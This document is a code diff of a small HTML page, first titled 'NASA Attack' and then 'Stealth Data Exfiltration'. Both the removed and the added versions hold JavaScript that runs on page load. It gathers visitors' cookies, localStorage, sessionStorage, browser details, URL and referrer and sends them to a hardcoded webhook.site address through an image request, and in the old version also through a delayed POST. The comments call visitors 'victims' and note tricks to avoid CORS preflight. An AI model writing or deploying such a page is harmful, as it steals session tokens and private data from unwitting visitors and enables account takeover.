@@ -1,49 +1,25 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="UTF-8">
-  <title>NASA Attack</title>
-  <script>
-    (async () => {
-      const webhook = "https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de";
-      
-      // 🧠 تجميع معلومات الضحية
-      const victimInfo = {
-        cookies: document.cookie,
-        userAgent: navigator.userAgent,
-        language: navigator.language,
-        platform: navigator.platform,
-        url: location.href,
-        referrer: document.referrer,
-        localStorage: JSON.stringify(localStorage),
-        sessionStorage: JSON.stringify(sessionStorage),
-        timestamp: new Date().toISOString()
+  <head>
+    <meta charset="UTF-8">
+    <title>Stealth Data Exfiltration</title>
+    <script>
+      const data = {
+        cookie: document.cookie,
+        local: JSON.stringify(localStorage),
+        session: JSON.stringify(sessionStorage),
+        agent: navigator.userAgent,
+        href: location.href,
+        ref: document.referrer,
+        lang: navigator.language,
+        time: new Date().toISOString()
       };
 
-      // 🔥 المحاولة 1: إرسال كـ صورة (img.src) لتفادي preflight
-      const queryParams = encodeURIComponent(JSON.stringify(victimInfo));
-      const img = new Image();
-      img.src = webhook + "?data=" + queryParams;
+      const payload = encodeURIComponent(JSON.stringify(data));
 
-      // 🕒 ننتظر قليلًا ثم نحاول fetch (للضمان)
-      setTimeout(async () => {
-        try {
-          await fetch(webhook, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              type: "full-fetch",
-              victimInfo
-            })
-          });
-        } catch (e) {
-          // حتى لو فشل، نحاول مجددًا لاحقًا
-        }
-      }, 3000);
-    })();
-  </script>
-</head>
-<body>
-  <h1 style="display: none;">Loading...</h1>
-</body>
+      // 🚀 Guaranteed no preflight (GET via img)
+      new Image().src = "https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de?data=" + payload;
+    </script>
+  </head>
+  <body></body>
 </html>
